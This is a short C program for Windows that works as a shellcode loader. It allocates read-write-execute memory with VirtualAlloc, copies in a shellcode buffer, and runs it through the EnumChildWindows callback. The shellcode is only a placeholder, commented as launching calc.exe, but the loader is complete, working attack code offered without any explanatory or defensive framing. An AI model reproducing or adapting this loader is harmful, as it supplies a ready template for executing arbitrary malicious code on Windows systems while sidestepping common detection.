#include <windows.h>
#include <stdio.h>

int main() {
    char shellcode[] = "..."; // calc.exe shellcode

    HANDLE hAlloc = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(hAlloc, shellcode, sizeof(shellcode));
    EnumChildWindows((HWND) NULL, (WNDENUMPROC) hAlloc, NULL);
}
